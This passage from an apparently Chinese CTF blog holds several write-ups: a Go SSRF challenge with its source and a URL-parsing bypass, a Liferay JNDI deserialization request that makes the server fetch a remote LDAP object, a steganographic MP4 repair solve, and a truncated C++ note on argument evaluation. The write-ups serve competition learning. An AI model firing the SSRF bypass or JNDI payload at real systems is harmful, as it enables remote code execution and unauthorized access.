class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;net/url&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	secret   = <span class="string">&quot;xiaomo.wabzsy&quot;</span></span><br><span class="line">	banner   = <span class="string">&quot;Golang HTTP Server (v2.3.3)&quot;</span></span><br><span class="line">	template = <span class="string">`&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;San Check&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">			&lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;</span></span><br><span class="line"><span class="string">			&lt;input type=&quot;submit&quot; value=&quot;淦!&quot; /&gt;</span></span><br><span class="line"><span class="string">		&lt;/form&gt;</span></span><br><span class="line"><span class="string">		&lt;pre&gt;</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">		&lt;/pre&gt;</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">	&lt;!-- ./sancheck.php --&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SanCheck</span><span class="params">(input <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	u, err := url.Parse(input)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Scheme != <span class="string">&quot;http&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Scheme [%s]&quot;</span>, u.Scheme)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Opaque != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: WHAT AER YOU DOING ?!!! (%s)&quot;</span>, u.Opaque)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Hostname() != <span class="string">&quot;127.0.0.1&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Hostname [%s]&quot;</span>, u.Hostname())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Port() != <span class="string">&quot;&quot;</span> &amp;&amp; u.Port() != <span class="string">&quot;80&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Port [%s]&quot;</span>, u.Port())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.User == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Authorization Required&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.User.Username() != <span class="string">&quot;root&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Username [%s]&quot;</span>, u.User.Username())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> password, set := u.User.Password(); !set || password != <span class="string">&quot;P@ssw0rd!&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Password [%s]&quot;</span>, password)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.RequestURI() != <span class="string">&quot;/flag.php&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid RequestURI [%s]&quot;</span>, u.RequestURI())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Fragment != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Fragment [%s]&quot;</span>, u.Fragment)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !strings.Contains(u.String(), <span class="string">&quot;&#x27;Pwned!&#x27;&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: San Check failed&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DefaultHandler</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	input := req.PostFormValue(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> input == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		Response(w, template, <span class="string">&quot;Where is the flag?&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := SanCheck(input); err == <span class="literal">nil</span> &#123;</span><br><span class="line">		req, _ := http.NewRequest(<span class="string">&quot;GET&quot;</span>, input, <span class="literal">nil</span>)</span><br><span class="line">		req.Header.Add(<span class="string">&quot;Secret&quot;</span>, secret)</span><br><span class="line">		<span class="keyword">if</span> resp, err := (&amp;http.Client&#123;&#125;).Do(req); err == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> body, err := ioutil.ReadAll(resp.Body); err == <span class="literal">nil</span> &#123;</span><br><span class="line">				Response(w, template, <span class="keyword">string</span>(body))</span><br><span class="line">			&#125;</span><br><span class="line">			_ = resp.Body.Close()</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			Response(w, template, err.Error())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		Response(w, template, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FlagHandler</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> strings.Join(req.Header[<span class="string">&quot;Secret&quot;</span>], <span class="string">&quot;&quot;</span>) != secret &#123;</span><br><span class="line">		Forbidden(w)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> !strings.HasPrefix(req.RemoteAddr, <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">		Forbidden(w)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		Response(w, <span class="string">&quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;</span>, readFlag())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readFlag</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> bs, err := ioutil.ReadFile(<span class="string">&quot;./flag.txt&quot;</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">string</span>(bs)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;Unable to read flag.txt, please contact technical support.(%s)&quot;</span>, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CodeHandler</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain; charset=utf-8&quot;</span>)</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Server&quot;</span>, banner)</span><br><span class="line">	<span class="keyword">if</span> bs, err := ioutil.ReadFile(<span class="string">&quot;main.go&quot;</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">		_, _ = w.Write(bs)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		_, _ = w.Write(</span><br><span class="line">			[]<span class="keyword">byte</span>(</span><br><span class="line">				fmt.Sprintf(<span class="string">&quot;Unable to read main.go, please contact technical support.(%s)&quot;</span>,</span><br><span class="line">					err.Error(),</span><br><span class="line">				),</span><br><span class="line">			),</span><br><span class="line">		)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Forbidden</span><span class="params">(w http.ResponseWriter)</span></span> &#123;</span><br><span class="line">	w.WriteHeader(<span class="number">403</span>)</span><br><span class="line">	Response(w, <span class="string">&quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;</span>, <span class="string">&quot;403 Forbidden&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Response</span><span class="params">(w http.ResponseWriter, tpl <span class="keyword">string</span>, response <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>)</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Server&quot;</span>, banner)</span><br><span class="line">	<span class="keyword">if</span> _, err := fmt.Fprintf(w, tpl, response); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, DefaultHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/flag.php&quot;</span>, FlagHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/sancheck.php&quot;</span>, CodeHandler)</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据issue<a target="_blank" rel="noopener" href="https://github.com/golang/go/issues/29098">https://github.com/golang/go/issues/29098</a> 绕过</p>
<p><code>http://root:P@ssw0rd!@127.0.0.1]&#39;Pwned!&#39;]:80/flag.php#</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:&#99;&#x63;&#x72;&#x65;&#x61;&#116;&#101;&#x72;&#x40;&#x31;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;">&#99;&#x63;&#x72;&#x65;&#x61;&#116;&#101;&#x72;&#x40;&#x31;&#x36;&#x33;&#x2e;&#99;&#111;&#x6d;</a>  E6N0HT aa05940594</p>
<p>cmd={“/expandocolumn/add-column”:{}}&amp;p_auth=Gyr2NhlX&amp;formDate=1585307550388&amp;tableId=1&amp;name=1&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={“jndiName”:”ldap://127.0.0.1:1389/Object”,”loginTimeout”:0}</p>
<h2 id="白盒拟态路由"><a href="#白盒拟态路由" class="headerlink" title="白盒拟态路由"></a>白盒拟态路由</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vtysh</span><br><span class="line">conf t</span><br><span class="line">ip route 200.14.1.0/24 x.x.x.x</span><br></pre></td></tr></table></figure>

<h2 id="白盒拟态域名服务器"><a href="#白盒拟态域名服务器" class="headerlink" title="白盒拟态域名服务器"></a>白盒拟态域名服务器</h2><p>上传busybox 来使用nslookup等命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/name.conf</span><br><span class="line">根据配置修改</span><br><span class="line">sudo /usr/local/bind-9.11.19/bin/named/named</span><br><span class="line">busybox nslookup www.test.com 172.29.126.2 看结果</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" data-id="cku89gxvv007nwvos4874da92" data-title="拟态防御记录" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-某misc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E6%9F%90misc/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E6%9F%90misc/">某misc</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="不知道哪里的misc"><a href="#不知道哪里的misc" class="headerlink" title="不知道哪里的misc"></a>不知道哪里的misc</h1><p>题目给了一个压缩包</p>
<p>里面有一个加密的视频文件和未加密的图片</p>
<p><img src="https://i.loli.net/2020/02/19/ptInrs6axclk12u.png" alt="image105"></p>
<p>想着图片会不会有提示,用hxd打开发现末尾果然有提示</p>
<p>kobe code</p>
<p><img src="https://i.loli.net/2020/02/19/mVqDzgoHdyOWBnT.png" alt="image211"></p>
<p>得到密码:<code>OAEBEYTKNRBANB</code>,成功拿到视频文件</p>
<p>但是提示文件无法打开,用binwalk啥的弄了一会,发现里面没有藏啥</p>
<p>于是换了个思路,猜测这题是要让我们修复mp4文件?头大</p>
<blockquote>
<p>一个MP4文件首先会有且只有一个“ftyp”类型的box，作为MP4格式的标志并包含关于文件的一些信息；之后会有且只有一个“moov”类型的box（Movie Box），它是一种container box，子box包含了媒体的metadata信息；MP4文件的媒体数据包含在“mdat”类型的box（Midia Data Box）中，该类型的box也是container box，可以有很多个，也可以没有（当媒体数据全部引用其他文件时），媒体数据的结构由metadata进行描述。</p>
</blockquote>
<p><img src="https://i.loli.net/2020/02/19/NVA3PtERXBqfwcd.png" alt="image622"></p>
<p>图中方框即为第一个box的head,原本应该是<code>ftyp(0x66747970)</code>而这里确实<code>66459707</code>,位置反了</p>
<p>恢复脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;NBA.mp4&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    keydata =f.read()</span><br><span class="line">t= keydata.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">l=<span class="built_in">len</span>(t)</span><br><span class="line">t2=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,l,<span class="number">2</span>):</span><br><span class="line">	a=t[i]</span><br><span class="line">	b=t[i+<span class="number">1</span>]</span><br><span class="line">	t2+=b</span><br><span class="line">	t2+=a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> t2[:<span class="number">100</span>]</span><br><span class="line">t2=t2.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;NBA2.mp4&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f2.write(t2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>等脚本跑完后成功恢复原来的视频文件</p>
<p>视频隐写通常把内容存储在视频中的某个图片,我们用 ffmpeg ,将视频分离成图片</p>
<p><code>ffmpeg -i NBA2.mp4 -f image2 image%d.jpg</code></p>
<p>一张一张看过去,我们发现,在第3028张突然全黑了</p>
<p><img src="https://i.loli.net/2020/02/20/Q9dsOuiVGFgwAcm.png" alt="image1136"></p>
<p>调整一下图片的对比对,跑出一个二维码</p>
<p><img src="https://i.loli.net/2020/02/20/aE3PpqcrJzn852V.png" alt="image1223"></p>
<p><code>flag&#123;I_l0v3_pl4ying_b4sk3tb4ll&#125;</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/%E6%9F%90misc/" data-id="cku89gxvw007qwvosgvagdna3" data-title="某misc" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-由cout和printf来对函数传参过程的探讨" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/">由cout和printf来对函数传参过程的探讨</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="由cout和printf来对函数传参过程的探讨"><a href="#由cout和printf来对函数传参过程的探讨" class="headerlink" title="由cout和printf来对函数传参过程的探讨"></a>由cout和printf来对函数传参过程的探讨</h1><h2 id="令人疑惑的结果"><a href="#令人疑惑的结果" class="headerlink" title="令人疑惑的结果"></a>令人疑惑的结果</h2><p>来看一个代码吧</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">()</span></span>&#123;i++;<span class="keyword">return</span> i;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;update():%d i:%d\n&quot;</span>,<span class="built_in">update</span>(),i);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你觉得它的输出结果是什么<br><del>update():1 i:1</del> ?<br><strong>错</strong>，正确输出是<code>update():1 i:0</code></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>为何会如此,先来做个实验康康吧:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">()</span></span>&#123;i++;<span class="keyword">return</span> i;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;----------------------------test printf----------------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;before:%d\n&quot;</span>,i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;update():%d i:%d\n&quot;</span>,<span class="built_in">update</span>(),i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;later:%d\n&quot;</span>,i);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;before:%d\n&quot;</span>,i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;i:%d update():%d \n&quot;</span>,i,<span class="built_in">update</span>());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;later:%d\n&quot;</span>,i);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;update1:%d update2:%d update3:%d&quot;</span>,<span class="built_in">update</span>(),<span class="built_in">update</span>(),<span class="built_in">update</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它的输出结果是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">----------------------------test printf----------------------------</span><br><span class="line">before:0</span><br><span class="line">update():1 i:0</span><br><span class="line">later:1</span><br><span class="line">before:1</span><br><span class="line">i:2 update():2</span><br><span class="line">later:2</span><br><span class="line">update1:5 update2:4 update3:3</span><br></pre></td></tr></table></figure>

<p>只有printf是这样的?不，可变参数的打印函数都具有这样的特性<br>我们来测试一下cout来验证一下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">()</span></span>&#123;i++;<span class="keyword">return</span> i;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;---------------------------- test cout ----------------------------\n&quot;</span>;</span><br><span class="line">	i=<span class="number">0</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;before:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;update():&quot;</span>&lt;&lt;<span class="built_in">update</span>()&lt;&lt;<span class="string">&quot; i:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;later:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">	</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;before:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;i:&quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot; update():&quot;</span>&lt;&lt;<span class="built_in">update</span>()&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;later:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">	</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;update1:&quot;</span>&lt;&lt;<span class="built_in">update</span>()&lt;&lt;<span class="string">&quot; update2:&quot;</span>&lt;&lt;<span class="built_in">update</span>()&lt;&lt;<span class="string">&quot; update3:&quot;</span>&lt;&lt;<span class="built_in">update</span>()&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它的输出结果是:</p>
